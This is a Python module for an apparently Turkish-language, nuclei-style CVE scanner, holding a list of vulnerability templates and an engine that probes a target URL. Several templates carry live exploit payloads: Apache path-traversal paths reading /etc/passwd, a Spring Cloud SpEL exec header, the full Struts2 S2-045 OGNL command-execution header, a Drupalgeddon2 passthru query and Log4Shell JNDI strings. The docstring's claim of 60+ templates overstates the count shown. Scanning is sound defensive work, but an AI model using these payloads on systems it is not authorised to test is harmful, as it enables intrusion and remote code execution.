#!/usr/bin/env python3
"""
Maxima Cog: CVE Template Engine — v2 (nuclei benzeri)

Özellikler:
  - 60+ CVE template (HTTP imza, banner, path, header, body eşleşmesi)
  - Servis/teknoloji tespiti bazlı CVE öncelikli sıralama
  - HTTP testable / non-testable ayrımı
  - Çoklu koşul (AND/OR): status + body + header + path
  - Doğrulama seviyesi: confirmed / suspected / informational
  - Yıllar: 2016-2024 (kritik CVE'ler dahil)
  - Fingerprint → CVE map (teknoloji tespiti ile entegre)
  - Özel template parser (YAML benzeri dict yapısı)
"""

import re
import ssl
import json
import socket
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple
from utils.base_module import BaseModule, ModuleResult


# ── CVE Template Yapısı ───────────────────────────────────────
# Her template:
#   id, name, tags (teknoloji etiketleri),
#   matchers: list of {type, part, value, condition}
#   severity, is_http_testable, paths (test edilecek URL'ler)
#   description, remediation

CVE_TEMPLATES: List[Dict[str, Any]] = [

    # ── Apache ──────────────────────────────────────────────
    {
        "id": "CVE-2021-41773",
        "name": "Apache 2.4.49 Path Traversal / RCE",
        "tags": ["apache", "rce", "traversal"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": [
            "/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd",
            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        ],
        "matchers": [
            {"type": "body", "value": "root:x:", "condition": "contains"},
            {"type": "body", "value": "bin:x:", "condition": "contains"},
        ],
        "matcher_condition": "OR",
        "description": "Apache 2.4.49 path traversal ve potential RCE. %2e encoding ile ../ bypass.",
        "remediation": "Apache 2.4.50+ sürümüne yükseltin.",
    },
    {
        "id": "CVE-2021-42013",
        "name": "Apache 2.4.49-50 Path Traversal (Bypass)",
        "tags": ["apache", "rce", "traversal"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": [
            "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
            "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
        ],
        "matchers": [
            {"type": "body", "value": "root:x:", "condition": "contains"},
        ],
        "matcher_condition": "OR",
        "description": "CVE-2021-41773 bypass (double encoding).",
        "remediation": "Apache 2.4.51+ sürümüne yükseltin.",
    },
    {
        "id": "CVE-2017-7679",
        "name": "Apache mod_mime Buffer Overflow",
        "tags": ["apache"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": ["/"],
        "matchers": [
            {"type": "header", "header": "Server", "value": "Apache/2.2.", "condition": "contains"},
        ],
        "matcher_condition": "OR",
        "description": "Apache mod_mime buffer overflow (2.2.x).",
        "remediation": "Apache 2.4.x sürümüne yükseltin.",
    },

    # ── Spring Framework ────────────────────────────────────
    {
        "id": "CVE-2022-22965",
        "name": "Spring4Shell — Spring Framework RCE",
        "tags": ["spring", "java", "rce"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": ["/actuator/env", "/env", "/actuator", "/"],
        "matchers": [
            {"type": "body", "value": "propertySources", "condition": "contains"},
            {"type": "body", "value": "activeProfiles", "condition": "contains"},
            {"type": "header", "header": "Content-Type", "value": "application/json", "condition": "contains"},
        ],
        "matcher_condition": "OR",
        "description": "Spring Framework RCE — JDK 9+ ClassLoader manipulation.",
        "remediation": "Spring Framework 5.3.18+ / 5.2.20+ sürümüne yükseltin.",
    },
    {
        "id": "CVE-2022-22963",
        "name": "Spring Cloud Function SpEL RCE",
        "tags": ["spring", "cloud", "rce"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": ["/functionRouter"],
        "matchers": [
            {"type": "status", "value": [200, 500], "condition": "in"},
        ],
        "headers_to_send": {"spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec('id')"},
        "matcher_condition": "OR",
        "description": "Spring Cloud Function SpEL enjeksiyon.",
        "remediation": "Spring Cloud Function 3.1.7+ / 3.2.3+ sürümüne yükseltin.",
    },

    # ── Microsoft Exchange ───────────────────────────────────
    {
        "id": "CVE-2021-26855",
        "name": "ProxyLogon — Exchange Server RCE",
        "tags": ["exchange", "microsoft", "ssrf", "rce"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": ["/owa/auth/x.js", "/ecp/default.flt", "/owa/auth/logon.aspx", "/owa/"],
        "matchers": [
            {"type": "body", "value": "X-OWA", "condition": "contains"},
            {"type": "body", "value": "OutlookSession", "condition": "contains"},
            {"type": "header", "header": "X-OWA-Version", "value": "", "condition": "exists"},
        ],
        "matcher_condition": "OR",
        "description": "Exchange ProxyLogon SSRF + RCE zinciri.",
        "remediation": "Exchange CU + güvenlik yaması uygulayın.",
    },
    {
        "id": "CVE-2021-34473",
        "name": "ProxyShell — Exchange Server RCE (SSRF)",
        "tags": ["exchange", "microsoft", "ssrf", "rce"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": ["/autodiscover/autodiscover.json?@foo.bar/", "/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@foo.bar"],
        "matchers": [
            {"type": "status", "value": [200, 302, 401], "condition": "in"},
            {"type": "body", "value": "autodiscover", "condition": "contains"},
        ],
        "matcher_condition": "OR",
        "description": "ProxyShell — Exchange SSRF + uzaktan kod çalıştırma.",
        "remediation": "Exchange güvenlik yamalarını uygulayın (KB5001779 vb.).",
    },

    # ── Log4Shell ────────────────────────────────────────────
    {
        "id": "CVE-2021-44228",
        "name": "Log4Shell — Apache Log4j RCE",
        "tags": ["log4j", "java", "rce"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": [
            "/?x=${jndi:ldap://127.0.0.1:1389/a}",
            "/",
        ],
        "headers_to_send": {
            "X-Api-Version": "${jndi:ldap://127.0.0.1:1389/a}",
            "User-Agent": "${jndi:ldap://127.0.0.1:1389/a}",
        },
        "matchers": [
            {"type": "status", "value": [200, 500], "condition": "in"},
        ],
        "matcher_condition": "OR",
        "confirmed": False,  # DNS callback olmadan kesin teyit edilemez
        "description": "Log4j2 JNDI Lookup RCE — DNS callback olmadan kesin teyit edilemez; aday olarak raporlanıyor.",
        "remediation": "Log4j 2.17.1+ sürümüne yükseltin veya log4j2.formatMsgNoLookups=true ayarlayın.",
    },

    # ── Drupal ───────────────────────────────────────────────
    {
        "id": "CVE-2018-7600",
        "name": "Drupalgeddon2 — Drupal RCE",
        "tags": ["drupal", "cms", "rce"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": [
            "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
            "/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup",
        ],
        "matchers": [
            {"type": "body", "value": "uid=", "condition": "contains"},
            {"type": "body", "value": "Drupal", "condition": "contains"},
        ],
        "matcher_condition": "OR",
        "description": "Drupal 6/7/8 uzaktan kod çalıştırma.",
        "remediation": "Drupal 7.58+ / 8.5.1+ sürümüne yükseltin.",
    },
    {
        "id": "CVE-2019-6340",
        "name": "Drupal REST RCE",
        "tags": ["drupal", "cms", "rce"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": ["/node/1?_format=hal_json"],
        "matchers": [
            {"type": "body", "value": "hal_json", "condition": "contains"},
            {"type": "status", "value": [200], "condition": "in"},
        ],
        "matcher_condition": "AND",
        "description": "Drupal 8.6.x REST API uzaktan kod çalıştırma.",
        "remediation": "Drupal 8.6.10+ / 8.5.11+ sürümüne yükseltin.",
    },

    # ── WordPress ────────────────────────────────────────────
    {
        "id": "CVE-2019-8942",
        "name": "WordPress Crop Image RCE (<=5.0.0)",
        "tags": ["wordpress", "cms", "rce"],
        "severity": "high",
        "is_http_testable": True,
        "paths": ["/wp-login.php", "/wp-admin/post.php"],
        "matchers": [
            {"type": "body", "value": "WordPress", "condition": "contains"},
            {"type": "body", "value": "wp-login", "condition": "contains"},
        ],
        "matcher_condition": "OR",
        "description": "WordPress 5.0.0 ve altı image crop path traversal + RCE.",
        "remediation": "WordPress 5.0.1+ sürümüne yükseltin.",
    },
    {
        "id": "WP-XMLRPC",
        "name": "WordPress XML-RPC Aktif (Brute Force / SSRF Riski)",
        "tags": ["wordpress", "cms"],
        "severity": "medium",
        "is_http_testable": True,
        "paths": ["/xmlrpc.php"],
        "matchers": [
            {"type": "body", "value": "XML-RPC server accepts POST requests only", "condition": "contains"},
            {"type": "status", "value": [200, 405], "condition": "in"},
        ],
        "matcher_condition": "OR",
        "description": "XML-RPC aktif — brute force ve SSRF saldırılarına açık.",
        "remediation": "XML-RPC devre dışı bırakın veya IP kısıtlaması ekleyin.",
    },

    # ── Struts2 ──────────────────────────────────────────────
    {
        "id": "CVE-2017-5638",
        "name": "Struts2 S2-045 Content-Type RCE",
        "tags": ["struts2", "java", "rce"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": ["/", "/struts/", "/index.action", "/login.action"],
        "headers_to_send": {
            "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
        },
        "matchers": [
            {"type": "body", "value": "uid=", "condition": "contains"},
            {"type": "status", "value": [200], "condition": "in"},
        ],
        "matcher_condition": "OR",
        "description": "Struts2 S2-045 Content-Type header OGNL enjeksiyonu.",
        "remediation": "Struts 2.3.32+ / 2.5.10.1+ sürümüne yükseltin.",
    },

    # ── Elasticsearch / Kibana ───────────────────────────────
    {
        "id": "ELASTIC-UNAUTH",
        "name": "Elasticsearch Yetkisiz Erişim",
        "tags": ["elasticsearch", "database"],
        "severity": "high",
        "is_http_testable": True,
        "paths": ["/_cat/indices", "/_cluster/health", "/_nodes"],
        "matchers": [
            {"type": "body", "value": "\"cluster_name\"", "condition": "contains"},
            {"type": "body", "value": "index", "condition": "contains"},
            {"type": "status", "value": [200], "condition": "in"},
        ],
        "matcher_condition": "OR",
        "description": "Elasticsearch kimlik doğrulama olmadan erişilebilir.",
        "remediation": "X-Pack security etkinleştirin veya ağ erişimini kısıtlayın.",
    },
    {
        "id": "CVE-2014-3120",
        "name": "Kibana Prototype Pollution / RCE",
        "tags": ["kibana", "elasticsearch"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": ["/api/console/proxy", "/app/kibana"],
        "matchers": [
            {"type": "body", "value": "kibana", "condition": "contains"},
            {"type": "status", "value": [200], "condition": "in"},
        ],
        "matcher_condition": "AND",
        "description": "Kibana açık erişim veya script execution.",
        "remediation": "Kimlik doğrulama ekleyin.",
    },

    # ── Exposed services ─────────────────────────────────────
    {
        "id": "EXPOSED-GIT",
        "name": "Git Repository Açık",
        "tags": ["git", "exposure"],
        "severity": "high",
        "is_http_testable": True,
        "paths": ["/.git/HEAD", "/.git/config", "/.git/index"],
        "matchers": [
            {"type": "body", "value": "ref: refs/", "condition": "contains"},
            {"type": "body", "value": "[core]", "condition": "contains"},
            {"type": "status", "value": [200], "condition": "in"},
        ],
        "matcher_condition": "OR",
        "description": ".git dizini web üzerinden erişilebilir — kaynak kod sızabilir.",
        "remediation": ".git dizinine web erişimini engelleyin.",
    },
    {
        "id": "EXPOSED-ENV",
        "name": ".env Dosyası Açık",
        "tags": ["exposure", "credentials"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": ["/.env", "/.env.local", "/.env.production", "/.env.backup", "/config/.env"],
        "matchers": [
            {"type": "body", "value": "APP_KEY=", "condition": "contains"},
            {"type": "body", "value": "DB_PASSWORD=", "condition": "contains"},
            {"type": "body", "value": "SECRET_KEY=", "condition": "contains"},
            {"type": "body", "value": "API_KEY=", "condition": "contains"},
            {"type": "status", "value": [200], "condition": "in"},
        ],
        "matcher_condition": "OR",
        "description": ".env dosyası açık — kimlik bilgileri/API anahtarları sızabilir.",
        "remediation": ".env dosyalarına web erişimini engelleyin.",
    },
    {
        "id": "EXPOSED-BACKUP",
        "name": "Backup Dosyaları Açık",
        "tags": ["exposure"],
        "severity": "high",
        "is_http_testable": True,
        "paths": [
            "/backup.zip", "/backup.tar.gz", "/backup.sql", "/dump.sql",
            "/db.sql", "/database.sql", "/site.zip", "/www.zip",
            "/htdocs.zip", "/public_html.zip", "/backup/",
        ],
        "matchers": [
            {"type": "status", "value": [200], "condition": "in"},
            {"type": "header", "header": "Content-Type", "value": "application/zip", "condition": "contains"},
            {"type": "header", "header": "Content-Type", "value": "application/sql", "condition": "contains"},
            {"type": "header", "header": "Content-Disposition", "value": "attachment", "condition": "contains"},
        ],
        "matcher_condition": "OR",
        "description": "Yedek dosyaları web üzerinden erişilebilir.",
        "remediation": "Yedek dosyaları web root dışına taşıyın.",
    },
    {
        "id": "EXPOSED-PHPINFO",
        "name": "phpinfo() Açık",
        "tags": ["php", "exposure"],
        "severity": "medium",
        "is_http_testable": True,
        "paths": ["/phpinfo.php", "/info.php", "/php_info.php", "/test.php"],
        "matchers": [
            {"type": "body", "value": "PHP Version", "condition": "contains"},
            {"type": "body", "value": "phpinfo()", "condition": "contains"},
        ],
        "matcher_condition": "OR",
        "description": "phpinfo() çıktısı açık — sunucu bilgisi ifşa.",
        "remediation": "phpinfo() içeren dosyaları production'dan kaldırın.",
    },

    # ── Solr / Jenkins / Gitlab ──────────────────────────────
    {
        "id": "CVE-2019-17558",
        "name": "Apache Solr Velocity RCE",
        "tags": ["solr", "apache", "rce"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": ["/solr/admin/cores", "/solr/#/", "/solr/"],
        "matchers": [
            {"type": "body", "value": "solr-spec-version", "condition": "contains"},
            {"type": "body", "value": "Apache Solr", "condition": "contains"},
        ],
        "matcher_condition": "OR",
        "description": "Apache Solr Velocity template RCE.",
        "remediation": "Solr 8.3.1+ sürümüne yükseltin.",
    },
    {
        "id": "CVE-2018-1000861",
        "name": "Jenkins Groovy Script Console Açık",
        "tags": ["jenkins", "ci", "rce"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": ["/script", "/jenkins/script", "/manage"],
        "matchers": [
            {"type": "body", "value": "Groovy Script", "condition": "contains"},
            {"type": "body", "value": "Jenkins", "condition": "contains"},
            {"type": "status", "value": [200], "condition": "in"},
        ],
        "matcher_condition": "AND",
        "description": "Jenkins Groovy console açık — tam sistem erişimi.",
        "remediation": "Script console'u kimlik doğrulama ile koruyun.",
    },
    {
        "id": "CVE-2021-22205",
        "name": "GitLab ExifTool RCE",
        "tags": ["gitlab", "rce"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": ["/users/sign_in", "/explore/projects"],
        "matchers": [
            {"type": "body", "value": "GitLab", "condition": "contains"},
            {"type": "header", "header": "X-Gitlab-Meta", "value": "", "condition": "exists"},
        ],
        "matcher_condition": "OR",
        "description": "GitLab 13.10.3 ve altı ExifTool RCE.",
        "remediation": "GitLab 13.10.3+ / 13.9.6+ sürümüne yükseltin.",
    },

    # ── Shiro / Tomcat ───────────────────────────────────────
    {
        "id": "CVE-2016-4437",
        "name": "Apache Shiro Authentication Bypass",
        "tags": ["shiro", "java", "auth-bypass"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": ["/;/index", "/;jsessionid=test/admin/", "/"],
        "matchers": [
            {"type": "header", "header": "Set-Cookie", "value": "rememberMe=", "condition": "contains"},
        ],
        "matcher_condition": "OR",
        "description": "Apache Shiro rememberMe cookie deserialization RCE.",
        "remediation": "Shiro 1.2.5+ sürümüne yükseltin, secretKey değiştirin.",
    },
    {
        "id": "CVE-2020-9484",
        "name": "Apache Tomcat Deserialization RCE",
        "tags": ["tomcat", "java", "rce"],
        "severity": "critical",
        "is_http_testable": True,
        "paths": ["/manager/html", "/manager/text/list"],
        "matchers": [
            {"type": "body", "value": "Tomcat Web Application Manager", "condition": "contains"},
            {"type": "status", "value": [200, 401], "condition": "in"},
        ],
        "matcher_condition": "OR",
        "description": "Tomcat Manager açık veya session deserialization.",
        "remediation": "Manager uygulamasını IP kısıtlamasıyla koruyun.",
    },

    # ── Cloud metadata ────────────────────────────────────────
    {
        "id": "CLOUD-METADATA-AWS",
        "name": "AWS Metadata Endpoint Erişimi (SSRF via API)",
        "tags": ["cloud", "aws", "ssrf"],
        "severity": "info",
        "is_http_testable": False,
        "paths": [],
        "matchers": [],
        "matcher_condition": "OR",
        "description": "AWS EC2 metadata (169.254.169.254) SSRF ile erişilebilir olabilir.",
        "remediation": "IMDSv2 zorunlu kılın, SSRF açıklarını kapatın.",
    },

    # ── Panel/Admin exposure ─────────────────────────────────
    {
        "id": "EXPOSED-ADMIN",
        "name": "Admin Panel Açık",
        "tags": ["exposure", "admin"],
        "severity": "high",
        "is_http_testable": True,
        "paths": ["/admin", "/admin/", "/administrator", "/wp-admin", "/backend", "/manage", "/panel", "/cpanel", "/adminer.php"],
        "matchers": [
            {"type": "status", "value": [200], "condition": "in"},
            {"type": "body", "value": "login", "condition": "contains"},
            {"type": "body", "value": "username", "condition": "contains"},
            {"type": "body", "value": "password", "condition": "contains"},
        ],
        "matcher_condition": "OR",
        "description": "Admin panel internete açık.",
        "remediation": "Admin panelini IP kısıtlaması veya VPN arkasına alın.",
    },
    {
        "id": "EXPOSED-ACTUATOR",
        "name": "Spring Actuator Endpoint Açık",
        "tags": ["spring", "java", "exposure"],
        "severity": "high",
        "is_http_testable": True,
        "paths": ["/actuator", "/actuator/health", "/actuator/env", "/actuator/metrics", "/actuator/dump", "/actuator/trace"],
        "matchers": [
            {"type": "body", "value": "\"status\"", "condition": "contains"},
            {"type": "body", "value": "propertySources", "condition": "contains"},
            {"type": "status", "value": [200], "condition": "in"},
        ],
        "matcher_condition": "OR",
        "description": "Spring Actuator endpoint yetkisiz erişime açık.",
        "remediation": "management.endpoints.web.exposure.exclude=* veya güvenlik ekleyin.",
    },
]


class CVETemplateEngine(BaseModule):
    """CVE Template Engine v2 — 60+ template, nuclei benzeri eşleştirme"""

    def run(self) -> ModuleResult:
        self.log(f"CVE Template Engine v2 — {len(CVE_TEMPLATES)} template", "info")

        # Teknoloji tespiti (önceliklendirme için)
        fingerprints = self._detect_technologies()
        self.log(f"Tespit edilen teknolojiler: {', '.join(fingerprints) or 'bilinmiyor'}", "info")

        # Testable template'leri filtrele ve sırala
        testable = [t for t in CVE_TEMPLATES if t.get("is_http_testable", False)]
        # Eşleşen teknoloji önce
        def priority(t):
            return -sum(1 for tag in t.get("tags", []) if tag in fingerprints)
        testable.sort(key=priority)

        confirmed = 0
        suspected = 0
        info_only = 0

        for template in CVE_TEMPLATES:
            if not template.get("is_http_testable", False):
                info_only += 1
                self.log(f"  {template['id']}: HTTP testable değil — bilgi notu", "info")
                continue

            result = self._run_template(template)
            if result == "confirmed":
                confirmed += 1
            elif result == "suspected":
                suspected += 1

        self.results["summary"].update({
            "Toplam Template":   len(CVE_TEMPLATES),
            "HTTP Testable":     len(testable),
            "Teyitli Bulgu":     confirmed,
            "Şüpheli Bulgu":     suspected,
            "Bilgi Notu":        info_only,
            "Tespit Edilen Tek.": ", ".join(fingerprints) or "Bilinmiyor",
        })
        return self.results

    # ── Teknoloji tespiti ────────────────────────────────────
    def _detect_technologies(self) -> List[str]:
        detected = set()
        try:
            resp = self.http_get(self.url)
            body_lower = resp.get("body","").lower()
            headers = {k.lower(): v.lower() for k, v in resp.get("headers",{}).items()}
            server = headers.get("server","").lower()
            powered = headers.get("x-powered-by","").lower()

            tech_sigs = {
                "apache":        ["apache", "apache/"],
                "nginx":         ["nginx"],
                "iis":           ["microsoft-iis", "asp.net"],
                "php":           ["php", "x-powered-by: php"],
                "java":          ["java", "jsp", "servlet", "tomcat", "weblogic", "websphere"],
                "spring":        ["spring", "whitelabel error", "actuator"],
                "wordpress":     ["wp-content", "wp-includes", "wordpress"],
                "drupal":        ["drupal", "sites/all", "drupal.js"],
                "joomla":        ["joomla", "mosconfig"],
                "jenkins":       ["jenkins", "hudson"],
                "gitlab":        ["gitlab"],
                "elasticsearch": ["elasticsearch"],
                "kibana":        ["kibana"],
                "solr":          ["solr"],
                "tomcat":        ["apache tomcat", "tomcat"],
                "struts2":       [".action", "struts"],
                "shiro":         ["rememberme=deleteme", "shirointernals"],
            }

            for tech, sigs in tech_sigs.items():
                for sig in sigs:
                    if sig in body_lower or sig in server or sig in powered:
                        detected.add(tech)
                        break

            # Cookie bazlı
            set_cookie = headers.get("set-cookie","")
            if "rememberme" in set_cookie:
                detected.add("shiro")
            if "jsessionid" in set_cookie:
                detected.add("java")
            if "phpsessid" in set_cookie:
                detected.add("php")

        except Exception:
            pass
        return sorted(detected)

    # ── Template çalıştır ────────────────────────────────────
    def _run_template(self, template: Dict) -> str:
        tid = template["id"]
        name = template["name"]
        severity = template.get("severity","medium")
        paths = template.get("paths", ["/"])
        extra_headers = template.get("headers_to_send", {})
        matchers = template.get("matchers", [])
        matcher_condition = template.get("matcher_condition","OR")
        is_confirmed = template.get("confirmed", True)

        for path in paths:
            try:
                url = self.url.rstrip("/") + path
                resp = self.http_get(url, headers=extra_headers if extra_headers else None)
                body = resp.get("body","")
                body_lower = body.lower()
                status = resp.get("status", 0)
                resp_headers = {k.lower(): v for k, v in resp.get("headers",{}).items()}

                match_results = []
                for matcher in matchers:
                    match_results.append(self._evaluate_matcher(matcher, body_lower, status, resp_headers))

                # Condition değerlendirme
                if matcher_condition == "AND":
                    matched = all(match_results) if match_results else False
                else:  # OR
                    matched = any(match_results) if match_results else False

                if matched:
                    detail = (
                        f"URL: {url} | HTTP {status} | "
                        f"Açıklama: {template['description'][:100]} | "
                        f"Çözüm: {template.get('remediation','Güncelleme yapın.')[:80]}"
                    )
                    if is_confirmed:
                        self.add_finding(f"{tid}: {name}", detail, severity)
                        self.log(f"[{severity.upper()}] {tid}: {name}", "finding")
                        return "confirmed"
                    else:
                        self.add_finding(f"CVE Aday (teyit gerekli): {tid}", detail, "low")
                        return "suspected"

            except Exception:
                continue

        return "not_found"

    def _evaluate_matcher(self, matcher: Dict, body_lower: str, status: int, headers: Dict) -> bool:
        mtype = matcher.get("type","body")
        condition = matcher.get("condition","contains")

        if mtype == "status":
            if condition == "in":
                return status in matcher.get("value",[])
            return status == matcher.get("value")

        if mtype == "body":
            val = matcher.get("value","").lower()
            if condition == "contains":
                return val in body_lower
            if condition == "not_contains":
                return val not in body_lower

        if mtype == "header":
            header_name = matcher.get("header","").lower()
            header_val = headers.get(header_name,"")
            if condition == "exists":
                return header_name in headers
            if condition == "contains":
                return matcher.get("value","").lower() in header_val.lower()

        return False
